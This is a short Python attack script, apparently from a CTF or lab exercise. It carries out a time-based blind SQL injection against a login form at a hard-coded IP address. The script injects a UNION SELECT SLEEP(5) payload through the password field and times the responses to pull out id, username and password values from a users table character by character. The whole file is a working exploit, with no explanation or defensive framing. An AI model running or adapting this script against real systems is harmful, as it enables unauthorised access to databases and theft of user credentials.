import requests
import time


def dump_columns():
    tab = ["id", "username", "password"]
    dictionary = ["1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
    texte = ""
    TIME = 5
    table = ",1,2"
    a = 0
    nom_colonne = ["1","2","3","4"]
    z=1
    url = "http://51.15.136.118/pageid.php"
    idk = []

    while z <= (len(tab)):
        for x in nom_colonne:
            x = int(x)
            for i in range (1,30):
                for j in range(0, len(dictionary)):
                    if a > 36:
                        if texte != "":
                            """rm_letter = texte[0]
                            dictionary.remove(rm_letter)"""
                            idk.append(texte)
                            print("idk")
                            print(idk)
                            print("dictionary")
                            print(dictionary)
                            a=0
                            texte = ""
                            x += 1
                            break
                        else:
                            break

                    usr = "idc"
                    start_time = time.time()
                    passwd = "' UNION SELECT SLEEP(5)" + table + " "" " + tab[0] + " FROM users WHERE " + tab[0] + " = " + str(x) + " and " + tab[z] + " like '" + texte + dictionary[j] + "%' -- "
                    response = requests.post(url, data={'username': usr, 'password': passwd})
                    print(passwd)
                    end_time = time.time()
                    total_time = end_time - start_time
                    a+=1
                    print("a")
                    print(a)
                    if total_time >= TIME:
                        texte += dictionary[j]
                        print("texte")
                        print(texte)
                        a=0
                        j=0
                        i+=1
                        print("i")
                        print(i)
                        break
        print("z")
        print(z)
        z+=1

    print(idk)

dump_columns()